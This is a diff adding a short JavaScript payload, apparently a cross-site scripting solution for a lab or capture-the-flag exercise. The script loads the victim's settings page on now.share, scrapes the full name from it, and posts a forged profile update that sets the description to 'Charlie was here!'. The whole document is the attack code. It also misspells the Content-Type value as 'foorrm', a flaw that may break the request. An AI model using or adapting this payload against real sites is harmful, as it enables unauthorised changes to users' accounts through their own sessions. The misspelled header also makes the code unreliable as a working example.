@@ -1,0 +1,14 @@
+<script>
+    var xhr = new XMLHttpRequest();
+    xhr.addEventListener("load", () => {
+        var xhr2 = new XMLHttpRequest();
+        var text = xhr.responseText;
+        var re = new RegExp(`id="full_name"  value="(.*?)"`)
+        var fullname = re.exec(text)[1]; // Getting the full name to keep it the same, because it is required in the form parameters
+        xhr2.open("POST", "http://now.share/update_profile")
+        xhr2.setRequestHeader( "Content-Type", "application/x-www-foorrm-urlencoded" );
+        xhr2.send("full_name=" + encodeURIComponent(fullname) + "&description=" + encodeURIComponent("Charlie was here!"))
+    })
+    xhr.open("GET", "http://now.share/settings");
+    xhr.send();
+</script>
